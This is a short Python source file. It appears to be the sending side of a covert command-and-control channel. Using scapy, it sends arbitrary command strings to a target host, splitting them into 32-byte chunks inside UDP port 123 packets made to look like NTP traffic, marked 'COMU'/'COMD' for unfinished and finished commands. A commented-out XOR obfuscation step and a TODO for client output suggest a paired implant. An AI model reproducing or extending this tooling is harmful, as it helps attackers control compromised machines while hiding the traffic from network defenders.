from scapy.all import IP, UDP, NTP, send


class Packet:
    def __init__(self, destination):
        self.destination = destination
        self.baseline = bytes([0x1A, 0x1, 0xA, 0xF0, 0, 0, 0, 0, 0, 0, 0, 0])


class CommandPacket(Packet):
    def __init__(self, destination, command):
        super().__init__(destination)
        self.command = command

    def sendCommandPacket(self):
        if len(self.command) > 32:
            cmdArr = [self.command[i : i + 32] for i in range(0, len(self.command), 32)]
        else:
            cmdArr = [self.command]

            # print(cmdArr)
        for ctr in range(0, len(cmdArr)):
            if ctr < len(cmdArr) - 1:
                refId = "COMU".encode()  # Command Unfinished
            else:
                refId = "COMD".encode()  # Command Finished

            ucode = cmdArr[ctr].encode()  # Encoded command

            fillerbytes = []
            for i in range(0, 32 - len(cmdArr[ctr])):
                fillerbytes.append(0)

            ntpPayload = bytes(self.baseline + refId + ucode + bytes(fillerbytes))

            # outbytes = b''
            # for bt in ntpPayload:
            # outbytes += bytes([bt ^ ord(chr(46))])

            packet = (
                IP(dst=self.destination) / UDP(dport=123, sport=50000) / (ntpPayload)
            )

            send(packet, verbose=0)


class IDPacket(Packet):
    def __init__(self, destination, refId):
        super().__init__(destination)
        self.refId = refId.encode()

    def sendIdPacket(self):
        fillerbytes = []
        for i in range(0, 32):
            fillerbytes.append(0)

        payload = bytes(self.baseline + self.refId + bytes(fillerbytes))

        packet = IP(dst=self.destination) / UDP(dport=123, sport=50000) / (payload)

        send(packet, verbose=0)


# TODO COMO ref id  -> output by client
